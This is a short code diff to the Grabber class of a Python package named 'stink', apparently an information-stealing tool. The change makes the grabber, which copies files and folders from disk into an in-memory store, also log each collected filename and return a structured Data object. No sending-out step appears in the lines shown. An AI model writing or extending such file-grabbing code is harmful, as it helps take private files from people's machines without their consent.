@@ -2,6 +2,7 @@ from typing import List
 from os import path, walk, listdir
 
 from stink.helpers import MemoryStorage
+from stink.helpers.dataclasses import Data
 
 
 class Grabber:
@@ -35,6 +36,7 @@ class Grabber:
                     continue
 
                 self.__storage.add_from_disk(item, path.join(self.__folder, item))
+                self.__storage.add_data("Grabber", path.basename(item))
 
             elif path.isdir(item):
 
@@ -46,6 +48,7 @@ class Grabber:
                                 continue
 
                             self.__storage.add_from_disk(path.join(folder_name, filename), path.join(self.__folder, filename))
+                            self.__storage.add_data("Grabber", filename)
                 else:
                     for filename in listdir(item):
 
@@ -53,8 +56,9 @@ class Grabber:
                             continue
 
                         self.__storage.add_from_disk(path.join(item, filename), path.join(self.__folder, filename))
+                        self.__storage.add_data("Grabber", filename)
 
-    def run(self) -> List:
+    def run(self) -> Data:
         """
         Launches the grabber module.
 
